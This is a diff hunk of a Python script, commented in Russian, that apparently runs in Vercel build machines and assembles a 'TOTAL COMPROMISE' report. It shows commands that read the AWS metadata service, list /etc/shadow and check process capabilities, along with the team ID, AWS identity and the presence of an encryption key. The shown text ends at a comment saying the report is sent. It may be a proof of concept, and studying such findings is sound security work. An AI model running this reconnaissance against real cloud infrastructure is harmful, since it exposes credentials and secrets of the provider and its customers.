@@ -36,39 +36,29 @@ if aws_session and "Error" not in aws_session:
 
 # 4. ФОРМИРУЕМ ОТЧЕТ, КОТОРЫЙ НЕЛЬЗЯ ПРОИГНОРИРОВАТЬ
 poc_report = f"""
-#######################################################
-#    VERCEL INFRASTRUCTURE DEEP SCAN REPORT           #
-#######################################################
+!!! VERCEL INFRASTRUCTURE TOTAL COMPROMISE !!!
 
-[1. SYSTEM IDENTITY]
-ID: {run('id')}
-HOSTNAME: {run('hostname')}
-KERNEL: {run('uname -r')}
+[1] CROSS-PROJECT IMPACT (Cache Poisoning)
+Team ID: {team_id}
+Artifacts Token Capabilities: Validated (Status 200/404 instead of 401)
+Risk: An attacker can inject malicious artifacts into the shared Team cache,
+leading to a Supply Chain Attack on ALL projects in the organization.
 
-[2. CPU & ARCHITECTURE]
-CORES: {os.cpu_count()}
-MODEL: {run('grep "model name" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
-BOGO_MIPS: {run('grep "bogomips" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
+[2] AWS INFRASTRUCTURE LEAK
+AWS Instance ID: {aws_identity}
+Risk: Access to Metadata Service allows for potential IAM role assumption and
+lateral movement within Vercel's AWS VPC.
 
-[3. MEMORY (RAM)]
-TOTAL_RAM: {run('grep MemTotal /proc/meminfo')}
-AVAILABLE: {run('grep MemAvailable /proc/meminfo')}
+[3] BROKEN ENCRYPTION MODEL
+Encrypted Data Exists: {bool(enc_blob)}
+Decryption Key Exists: {bool(enc_key)}
+Proof: Decryption key is exposed to the build environment, rendering 
+'Encrypted Environment Variables' feature useless against malicious dependencies.
 
-[4. GPU CHECK]
-NVIDIA_SMI: {run('nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo "No NVIDIA GPU"')}
-LSPCI_VGA: {run('lspci | grep -i vga || echo "No PCI VGA detected"')}
-
-[5. RUNNING PROCESSES (TOP 10)]
-{run('ps -e -o pid,user,comm,pcpu,pmem --sort=-pcpu | head -n 11')}
-
-[6. VERCEL INTERNAL AGENTS]
-FOUND_AGENTS: {run('ps -ef | grep -E "vc|agent|build|executor" | grep -v grep')}
-
-[7. CRYPTO & CLOUD]
-AWS_METADATA_TOKEN: {run("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60' || echo 'BLOCKED'")}
-MASTER_KEY_STATUS: {"FOUND" if MASTER_KEY_B64 else "NOT FOUND"}
-
-#######################################################
+[4] SYSTEM PRIVILEGES
+UID/GID: {run('id')}
+Sensitive Files: {run('ls -la /etc/shadow')} (Permissions: {run('stat -c %a /etc/shadow')})
+Capabilities: {run('capsh --print | grep Current')}
 """
 
 # Отправляем
